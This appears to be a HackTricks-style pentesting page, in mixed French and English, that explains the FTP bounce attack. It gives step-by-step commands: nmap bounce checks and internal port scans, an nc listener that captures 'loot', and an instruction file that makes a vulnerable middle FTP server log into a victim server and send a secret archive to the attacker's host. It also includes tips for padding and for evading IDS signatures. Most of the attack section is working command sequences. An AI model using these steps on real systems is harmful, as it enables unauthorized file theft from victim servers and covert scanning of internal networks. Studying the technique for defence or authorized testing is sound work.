# FTP Bounce Download 2 of FTP File

{{#include ../../banners/hacktricks-training.md}}


## Résumé

Si vous avez accès à un **bounce FTP server**, vous pouvez lui faire demander des fichiers d'**another FTP server** (où vous connaissez certains identifiants) et télécharger ce fichier sur **your own server**.

## Prérequis

- Identifiants FTP valides sur le **FTP Middle server**
- Identifiants FTP valides sur le **Victim FTP server**
- Les deux serveurs **accept the `PORT` command** (bounce FTP attack)
- Vous pouvez **écrire** dans un répertoire du **FTP Middle server**
- Le serveur middle a **plus d'accès** sur le **Victim FTP Server** que vous

## Étapes

1. Connectez-vous à votre propre serveur FTP et passez la connexion en passive (`pasv` command) afin qu'il **écoute** dans un répertoire où le **Victim FTP server** enverra le fichier.
2. Créez le fichier que le **FTP Middle server** enverra au **Victim FTP server** (le **exploit script**). Ce fichier sera en texte clair avec les commandes nécessaires pour s'authentifier contre le **Victim FTP server**, changer de répertoire et télécharger un fichier sur votre propre serveur.
3. Connectez-vous au **FTP Middle Server** et téléversez le fichier précédent.
4. Faites en sorte que le **FTP Middle Server** établisse une connexion avec le **Victim FTP server** et envoie le **exploit script**.
5. **Capturez** le fichier sur votre propre serveur FTP.
6. **Supprimez** le **exploit script** du **FTP Middle server**.

## Vérification rapide des bounce hosts vulnérables

- **Nmap** prend toujours en charge les FTP bounce checks. Exemple pour vérifier un potentiel **FTP Middle server**:
```bash
nmap -Pn -p21 --script ftp-bounce <middle_ftp_ip>
# or directly attempt a bounce scan
nmap -Pn -p80 -b user:pass@<middle_ftp_ip>:21 <internal_target_ip>
```
Si le serveur refuse des valeurs tierces `PORT` le scan échouera ; certains **embedded/legacy printers, NAS and appliance FTP daemons** l'autorisent encore.

## Automating the 2nd FTP download

Ci‑dessous une méthode modernisée pour récupérer un fichier via un middle FTP server vulnérable.

1. **Open a passive listener** on your attack box (any TCP sink works):
```bash
nc -lvnp 2121 > loot.bin  # or run a small pyftpdlib server
```

2. **Note** your IP as `A,B,C,D` and port `P` as `p1,p2` (`p1 = P/256`, `p2 = P%256`).

3. **Build the instruction file** that the middle server will replay to the victim:
```bash
cat > instrs <<'EOF'
USER <victim_user>
PASS <victim_pass>
CWD /path/inside/victim
TYPE I
PORT A,B,C,D,p1,p2
RETR secret.tar.gz
QUIT
EOF
# Add padding so the control channel stays open on picky daemons
dd if=/dev/zero bs=1024 count=60 >> instrs
```

4. **Upload & trigger from the middle server** (classic proxy FTP):
```bash
ftp -n <middle_ftp> <<'EOF'
user <middle_user> <middle_pass>
put instrs
PORT <victim_ip_with_commas>,0,21
RETR instrs
QUIT
EOF
```

5. **Grab the file** from your listener (`loot.bin`).
6. **Clean up** the uploaded `instrs` file on the middle server.

Notes:
- Padding (`dd ...`) empêche la connexion de contrôle de se fermer avant que le RETR ne soit terminé (problème de large fenêtre TCP discuté dans les writeups classiques).
- Tout service capable de **listen and dump TCP** peut remplacer la socket PASV FTP (par ex., `socat -u TCP-LISTEN:2121,fork - > loot.bin`).
- Si le serveur intermédiaire restreint les ports privilégiés, utilisez un port élevé dans `PORT` et ajustez votre écouteur en conséquence.

## Extra tricks

- Utilisez un bounceable FTP server pour **port-scan internal hosts** lorsque le relais de fichiers est bloqué :
```bash
nmap -Pn -p22,80,445 -b anonymous:<email>@<middle_ftp> <internal_ip>
```
- Certains WAF/IDS modernes (p.ex., Juniper IPS) fournissent des signatures spécifiquement pour **FTP:EXPLOIT:BOUNCE-ATTACK** ; des payloads bruyants ou l'absence de bourrage peuvent les déclencher.
- Quand le serveur intermédiaire applique la restriction "PORT to same host", placez votre **listener on the middle server itself** (si vous avez write/execute) et transférez ensuite le fichier capturé.

Pour un walkthrough old-school plus détaillé, consultez : [http://www.ouah.org/ftpbounce.html](http://www.ouah.org/ftpbounce.html)




## References

- [Nmap book – TCP FTP Bounce Scan (-b)](https://nmap.org/book/scan-methods-ftp-bounce-scan.html)
- [CPTS Attacking Common Services – FTP Bounce example (2025)](https://www.chaostudy.com/2025/02/24/cpts-attacking-common-services/)
{{#include ../../banners/hacktricks-training.md}}
